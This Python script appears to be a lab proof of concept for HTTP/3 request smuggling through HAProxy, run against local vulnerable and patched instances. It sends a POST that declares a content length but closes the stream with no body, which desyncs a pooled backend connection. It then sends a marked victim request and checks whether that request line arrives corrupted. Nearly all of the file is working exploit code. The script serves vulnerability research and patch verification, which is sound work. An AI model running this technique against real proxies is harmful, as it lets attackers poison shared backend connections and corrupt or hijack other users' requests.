"""Prove the FULL cross-connection smuggle end-to-end (not just CL!=delivered). Fire
the malicious standalone-FIN request (CL:N, 0 body) so HAProxy pools a desynced
backend conn, then fire a VICTIM request; if the victim's first N bytes are eaten as
the malicious body, the origin frames a CORRUPTED victim request-line. That is the
real pool-poisoning smuggle. Vuln (4434) vs patched (4433). This is the honest
positive control the hunt oracle rests on (premortem F3)."""
import asyncio, json, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/QuicDrawH3/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration
from phage.evo import genome as G
from phage.evo.driver import drive

ECHO = "logs/echo_vuln.jsonl"
ECHO_P = "logs/echo_patched.jsonl"   # patched lab writes to lab/logs; handle below


async def fire(port, genome):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", port, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=True)
        await asyncio.sleep(0.3)


def malicious(cl=44):
    return [G.Headers(((b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
                       (b":path", b"/evil"), (b"content-length", str(cl).encode())), end_stream=False),
            G.Fin()]


def victim():
    # a distinctive request-line so we can see if its first bytes were eaten
    return [G.Headers(((b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab"),
                       (b":path", b"/VICTIM_MARKER_AAAAAAAAAAAAAAAA")), end_stream=True)]


def records(log, off):
    try:
        with open(log, "rb") as f:
            f.seek(off); data = f.read()
    except OSError:
        return []
    out = []
    for line in data.split(b"\n"):
        if line.strip():
            try: out.append(json.loads(line))
            except Exception: out.append({"raw": line.decode("latin1", "replace")})
    return out


def run(label, port, log):
    off = os.path.getsize(log) if os.path.exists(log) else 0
    loop = asyncio.new_event_loop()
    try: loop.run_until_complete(fire(port, malicious(44)))
    except Exception: pass
    time.sleep(0.3)
    try: loop.run_until_complete(fire(port, victim()))
    except Exception: pass
    time.sleep(0.5)
    recs = records(log, off)
    print(f"\n### {label} (port {port})")
    print(f"  origin framed {len(recs)} record(s):")
    for r in recs:
        print(f"    {r}")
    # SMUGGLE signature: the victim's marker path is corrupted / not framed cleanly as its own GET
    clean_victim = any(r.get("boundaries") and any(b[0] == "GET" and "VICTIM_MARKER" in str(b[1]) for b in r["boundaries"]) for r in recs)
    print(f"  victim framed cleanly as its own GET /VICTIM_MARKER? {clean_victim}")
    if not clean_victim and recs:
        print("  *** SMUGGLE: victim request-line corrupted (bytes eaten by the pooled desync) ***")


if __name__ == "__main__":
    run("VULN 3.0.10", 4434, "logs/echo_vuln.jsonl")
    run("PATCHED 3.0.24", 4433, "../lab/logs/echo.jsonl")
